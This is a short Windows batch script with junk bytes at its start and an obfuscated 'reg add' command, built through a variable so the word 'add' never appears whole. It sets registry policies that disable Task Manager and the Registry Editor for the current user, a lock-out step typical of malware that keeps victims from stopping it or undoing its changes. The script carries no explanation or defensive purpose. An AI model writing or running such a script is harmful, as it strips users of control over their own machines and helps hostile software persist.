��&cls
set tes=ad
reg %tes%d HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
reg %tes%d HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System  /v  DisableTaskMgr  /t REG_DWORD  /d 1 /f
reg %tes%d "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /t Reg_dword /v DisableRegistryTools /f /d 1
cls